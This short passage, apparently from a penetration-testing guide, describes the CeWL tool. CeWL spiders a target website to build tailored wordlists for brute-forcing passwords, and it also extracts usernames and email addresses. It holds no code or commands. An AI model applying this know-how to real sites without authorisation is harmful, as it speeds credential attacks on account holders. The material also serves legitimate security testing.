## CeWL: Custom Wordlist Generator

Many tools rely on pre-defined lists or common dictionary attacks, but CeWL stands out for the following reasons:

      1. **Target-specific wordlists:**
         - CeWL crafts wordlists specifically from the content of a targeted website. The generated list is tailored to the vocabulary and terminology used on that site, increasing the efficiency of brute-forcing tasks.
      
      2. **Depth of search:**
         - CeWL can spider a website to a specified depth, extracting words not just from one page but also from linked pages up to the set depth.
      
      3. **Customizable outputs:**
         - CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This customization is advantageous for targeting specific types of credentials or vulnerabilities.
      
      4. **Built-in features:**
         - While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
      
      5. **Efficiency:**
         - Given its customizability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
      
      6. **Integration with other tools:**
         - Being command-line based, CeWL can be seamlessly integrated into automated workflows, and its outputs can be directly fed into other cybersecurity tools.
      
      7. **Actively maintained:**
         - CeWL is actively maintained and updated, staying relevant and compatible with contemporary security needs and challenges.
